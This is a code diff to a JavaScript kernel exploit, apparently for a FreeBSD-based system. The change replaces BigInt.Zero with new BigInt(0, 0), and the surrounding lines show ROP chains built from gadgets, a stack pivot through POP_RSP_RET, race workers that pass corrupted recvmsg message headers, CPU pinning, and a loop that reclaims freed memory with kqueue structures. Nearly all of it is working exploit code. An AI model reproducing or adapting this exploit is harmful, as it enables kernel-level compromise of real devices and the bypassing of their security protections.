@@ -216,11 +216,11 @@ for (var i = 0; i < MSG_IOV_NUM; i++) {
 
 // Prepare msg_hdr for recvmsg
 var msg_hdr = mem.malloc(MSG_HDR_SIZE)
-mem.view(msg_hdr).setBigInt(0x00, BigInt.Zero, true)                 // msg_name
+mem.view(msg_hdr).setBigInt(0x00, new BigInt(0, 0), true)                 // msg_name
 mem.view(msg_hdr).setUint32(0x08, 0, true)                           // msg_namelen
 mem.view(msg_hdr).setBigInt(0x10, msg_iov, true)                     // msg_iov
 mem.view(msg_hdr).setBigInt(0x18, new BigInt(0, MSG_IOV_NUM), true)  // msg_iovlen (Java uses putLong)
-mem.view(msg_hdr).setBigInt(0x20, BigInt.Zero, true)                 // msg_control
+mem.view(msg_hdr).setBigInt(0x20, new BigInt(0, 0), true)                 // msg_control
 mem.view(msg_hdr).setUint32(0x28, 0, true)                           // msg_controllen
 mem.view(msg_hdr).setUint32(0x2C, 0, true)                           // msg_flags
 
@@ -232,11 +232,11 @@ mem.view(corrupt_msg_iov).setBigInt(8, new BigInt(0, 1), true)  // iovec[0].iov_
 // Rest of iovecs remain zero (default from malloc)
 
 var corrupt_msg_hdr = mem.malloc(MSG_HDR_SIZE)
-mem.view(corrupt_msg_hdr).setBigInt(0x00, BigInt.Zero, true)         // msg_name
+mem.view(corrupt_msg_hdr).setBigInt(0x00, new BigInt(0, 0), true)         // msg_name
 mem.view(corrupt_msg_hdr).setUint32(0x08, 0, true)                   // msg_namelen
 mem.view(corrupt_msg_hdr).setBigInt(0x10, corrupt_msg_iov, true)     // msg_iov
 mem.view(corrupt_msg_hdr).setBigInt(0x18, new BigInt(0, MSG_IOV_NUM), true)  // msg_iovlen (Java uses putLong)
-mem.view(corrupt_msg_hdr).setBigInt(0x20, BigInt.Zero, true)         // msg_control
+mem.view(corrupt_msg_hdr).setBigInt(0x20, new BigInt(0, 0), true)         // msg_control
 mem.view(corrupt_msg_hdr).setUint32(0x28, 0, true)                   // msg_controllen
 mem.view(corrupt_msg_hdr).setUint32(0x2C, 0, true)                   // msg_flags
 
@@ -297,18 +297,18 @@ for (var w = 0; w < IOV_WORKER_NUM; w++) {
   // Rest of iovecs remain zero
 
   worker.corrupt_msg_hdr = mem.malloc(MSG_HDR_SIZE)
-  mem.view(worker.corrupt_msg_hdr).setBigInt(0x00, BigInt.Zero, true)         // msg_name
+  mem.view(worker.corrupt_msg_hdr).setBigInt(0x00, new BigInt(0, 0), true)         // msg_name
   mem.view(worker.corrupt_msg_hdr).setUint32(0x08, 0, true)                   // msg_namelen
   mem.view(worker.corrupt_msg_hdr).setBigInt(0x10, worker.corrupt_msg_iov, true)  // msg_iov
   mem.view(worker.corrupt_msg_hdr).setBigInt(0x18, new BigInt(0, MSG_IOV_NUM), true)  // msg_iovlen
-  mem.view(worker.corrupt_msg_hdr).setBigInt(0x20, BigInt.Zero, true)         // msg_control
+  mem.view(worker.corrupt_msg_hdr).setBigInt(0x20, new BigInt(0, 0), true)         // msg_control
   mem.view(worker.corrupt_msg_hdr).setUint32(0x28, 0, true)                   // msg_controllen
   mem.view(worker.corrupt_msg_hdr).setUint32(0x2C, 0, true)                   // msg_flags
 
   // CPU affinity structures for this worker (matching Poops.java IovThread)
   worker.cpumask = mem.malloc(0x10)
-  mem.view(worker.cpumask).setBigInt(0, BigInt.Zero, true)
-  mem.view(worker.cpumask).setBigInt(8, BigInt.Zero, true)
+  mem.view(worker.cpumask).setBigInt(0, new BigInt(0, 0), true)
+  mem.view(worker.cpumask).setBigInt(8, new BigInt(0, 0), true)
   mem.view(worker.cpumask).setUint16(0, 1 << 4, true)  // Pin to CPU 4
 
   // Realtime priority structure for this worker
@@ -351,7 +351,7 @@ function buildWorkerROP(worker) {
     rop.push(gadgets.POP_RDI_RET)
     rop.push(new BigInt(0, 1))  // RTP_SET
     rop.push(gadgets.POP_RSI_RET)
-    rop.push(BigInt.Zero)  // lwpid = 0
+    rop.push(new BigInt(0, 0))  // lwpid = 0
     rop.push(gadgets.POP_RDX_RET)
     rop.push(worker.rtp)
     rop.push(rtprio_thread_wrapper)
@@ -383,7 +383,7 @@ function buildWorkerROP(worker) {
   rop.push(gadgets.POP_RSI_RET)
   rop.push(worker.corrupt_msg_hdr)
   rop.push(gadgets.POP_RDX_RET)
-  rop.push(BigInt.Zero)
+  rop.push(new BigInt(0, 0))
   rop.push(recvmsg_wrapper)
 
   // Signal work done: write(ctrl_sock1, buf, 1)
@@ -407,8 +407,8 @@ function spawnWorker(worker_idx) {
   var worker = workers[worker_idx]
 
   // Reset TID values
-  mem.view(worker.child_tid).setBigInt(0, BigInt.Zero, true)
-  mem.view(worker.parent_tid).setBigInt(0, BigInt.Zero, true)
+  mem.view(worker.child_tid).setBigInt(0, new BigInt(0, 0), true)
+  mem.view(worker.parent_tid).setBigInt(0, new BigInt(0, 0), true)
 
   // Build and write ROP chain to dedicated ROP stack
   var rop = buildWorkerROP(worker)
@@ -426,7 +426,7 @@ function spawnWorker(worker_idx) {
 
   // Setup thr_param
   mem.view(worker.thr_param).setBigInt(0x00, gadgets.POP_RSP_RET, true)  // Entry: pop RSP (pivots to ROP stack)
-  mem.view(worker.thr_param).setBigInt(0x08, BigInt.Zero, true)
+  mem.view(worker.thr_param).setBigInt(0x08, new BigInt(0, 0), true)
   mem.view(worker.thr_param).setBigInt(0x10, worker.stack, true)
   mem.view(worker.thr_param).setBigInt(0x18, new BigInt(0, worker.stack_size), true)
   mem.view(worker.thr_param).setBigInt(0x20, worker.tls, true)
@@ -457,8 +457,8 @@ var MAIN_CORE = 4        // CPU core 4
 var CPU_SET_SIZE = 0x10  // 16 bytes
 var main_cpumask = mem.malloc(CPU_SET_SIZE)
 // Zero out the buffer
-mem.view(main_cpumask).setBigInt(0, BigInt.Zero, true)
-mem.view(main_cpumask).setBigInt(8, BigInt.Zero, true)
+mem.view(main_cpumask).setBigInt(0, new BigInt(0, 0), true)
+mem.view(main_cpumask).setBigInt(8, new BigInt(0, 0), true)
 // Set bit for CPU 4 using 16-bit short (matching Java putShort)
 mem.view(main_cpumask).setUint16(0, 1 << MAIN_CORE, true)
 
@@ -767,7 +767,7 @@ var kqueue_sys = fn.kqueue_sys
 
 // Loop until we reclaim with kqueue structure
 var kq_fd = -1
-var kq_fdp = BigInt.Zero
+var kq_fdp = new BigInt(0, 0)
 var max_attempts = 100
 
 for (var attempt = 0; attempt < max_attempts; attempt++) {
